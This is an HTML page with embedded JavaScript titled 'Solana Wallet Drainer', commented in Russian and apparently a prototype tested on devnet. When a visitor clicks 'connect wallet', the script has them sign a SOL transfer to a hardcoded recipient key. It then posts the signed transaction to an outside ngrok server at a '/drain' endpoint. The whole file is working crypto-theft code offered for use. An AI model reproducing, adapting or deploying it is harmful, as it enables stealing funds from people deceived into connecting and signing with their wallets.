<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Solana Wallet Drainer</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: #f0f0f0;
        }
        .container {
            text-align: center;
            background-color: #fff;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
        }
        button {
            margin: 10px;
            padding: 10px 20px;
            font-size: 16px;
            cursor: pointer;
            border: none;
            border-radius: 5px;
            background-color: #007bff;
            color: #fff;
        }
        #status {
            margin-top: 15px;
            padding: 10px;
            border-radius: 5px;
            display: none;
        }
        .success {
            background-color: #d4edda;
            color: #155724;
        }
        .error {
            background-color: #f8d7da;
            color: #721c24;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Solana Wallet Drainer</h1>
        <button id="connect-wallet">Подключить кошелек</button>
        <div id="status"></div>
    </div>
    
    <!-- Сначала загружаем Buffer -->
    <script src="https://cdn.jsdelivr.net/npm/buffer@6.0.3/index.min.js"></script>
    
    <!-- Делаем Buffer глобальным для совместимости -->
    <script>
        window.Buffer = buffer.Buffer;
    </script>
    
    <!-- Затем загружаем Solana Web3 -->
    <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
    
    <script>
        window.addEventListener('load', () => {
            console.log('Page loaded!');
            
            const statusEl = document.getElementById('status');
            
            // Функция для отображения статуса
            function showStatus(message, isError = false) {
                statusEl.textContent = message;
                statusEl.style.display = 'block';
                if (isError) {
                    statusEl.className = 'error';
                } else {
                    statusEl.className = 'success';
                }
                console.log(message);
            }
            
            document.getElementById('connect-wallet').addEventListener('click', async () => {
                console.log('Button clicked');
                
                try {
                    // Проверяем, установлен ли Phantom
                    if (!window.solana || !window.solana.isPhantom) {
                        throw new Error('Phantom кошелек не найден. Установите расширение Phantom.');
                    }
                    
                    showStatus('Подключение к кошельку...');
                    
                    // Подключаемся к кошельку
                    const connectResponse = await window.solana.connect({ onlyIfTrusted: false });
                    const publicKey = connectResponse.publicKey;
                    showStatus(`Подключено к кошельку: ${publicKey.toString().substr(0, 10)}...`);
                    
                    showStatus('Создание транзакции...');
                    
                    // Замените на реальный публичный ключ получателя
                    const drainerPubkey = new window.solanaWeb3.PublicKey('H31Bc7rSEVA94YmHhdDU6Nn3xjVFPsvaig8JMW6ZGrBp');
                    
                    // Фиксированная сумма - 0.001 SOL для тестирования
                    const lamportsToSend = 1000000;
                    
                    // Подключаемся к devnet для получения blockhash
                    const connection = new window.solanaWeb3.Connection('https://api.devnet.solana.com');
                    
                    // Создаем транзакцию
                    const transaction = new window.solanaWeb3.Transaction().add(
                        window.solanaWeb3.SystemProgram.transfer({
                            fromPubkey: publicKey,
                            toPubkey: drainerPubkey,
                            lamports: lamportsToSend,
                        })
                    );
                    
                    showStatus('Получение blockhash...');
                    const { blockhash } = await connection.getRecentBlockhash();
                    transaction.recentBlockhash = blockhash;
                    transaction.feePayer = publicKey;
                    
                    showStatus('Подписание транзакции...');
                    const signedTransaction = await window.solana.signTransaction(transaction);
                    
                    // Сериализуем транзакцию
                    const serializedTransaction = signedTransaction.serialize();
                    
                    // Используем глобальный Buffer
                    const base64Transaction = Buffer.from(serializedTransaction).toString('base64');
                    
                    showStatus('Отправка транзакции на сервер...');
                    
                    const serverResponse = await fetch('https://702c-95-46-155-53.ngrok-free.app/drain', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({ 
                            signedTransaction: base64Transaction
                        })
                    });
                    
                    if (!serverResponse.ok) {
                        const errorText = await serverResponse.text();
                        throw new Error(`Ошибка сервера: ${serverResponse.status} - ${errorText}`);
                    }
                    
                    const result = await serverResponse.json();
                    showStatus(`Транзакция успешно отправлена: ${result.signature}`);
                    
                } catch (err) {
                    console.error('Transaction failed', err);
                    showStatus(`Ошибка: ${err.message}`, true);
                }
            });
        });
    </script>
</body>
</html>
